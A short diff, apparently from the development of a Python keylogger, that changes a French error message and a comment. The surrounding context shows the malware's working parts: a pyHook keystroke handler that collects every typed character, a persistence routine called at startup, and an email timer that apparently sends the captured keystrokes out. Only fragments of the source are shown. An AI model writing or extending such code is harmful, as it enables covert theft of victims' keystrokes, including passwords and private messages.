@@ -1,7 +1,7 @@
 try:
     import pythoncom, pyHook
 except:
-    print "Les modules pywin32 et pyHook sont nécéssaires à l'installation.\nExit."
+    print "Les modules pywin32 et pyHook sont requis pour poursuivre l'execution.\nExit."
     exit(0)
 
 import os
@@ -85,7 +85,7 @@ def touches(event):
         keys = chr(event.Ascii)
     data = data + keys 
 
-# 
+# Main
 def main():
     persistance() 
     email = TimerClass()
